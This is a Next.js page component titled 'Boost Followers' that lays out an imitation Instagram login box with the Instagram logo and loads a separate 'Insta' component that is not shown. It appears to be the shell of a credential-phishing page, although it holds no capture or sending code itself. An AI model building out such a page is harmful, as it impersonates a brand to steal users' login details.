import Head from 'next/head'
import Image from 'next/image'
import Script from 'next/script'
import Link from 'next/link'
import Insta from "../components/Insta";
import { Inter } from '@next/font/google'
import styles from '../styles/Home.module.css'

const inter = Inter({ subsets: ['latin'] })

export default function Home() {
  return (
    <>
      <Head>
        <title>Boost Followers</title>
        
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>  
<span id="root">
  <section className="section-all">
    <main className="main" role="main">
      <div className="wrapper">
        <article className="article">
          <div className="content">
            <div className="login-box">
              <div className="header">
                <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
              </div>{/* Header end */}
              <div className="form-wrap">
              </div></div></div></article></div></main></section></span>
      <Insta />
  </>

    
  )
}
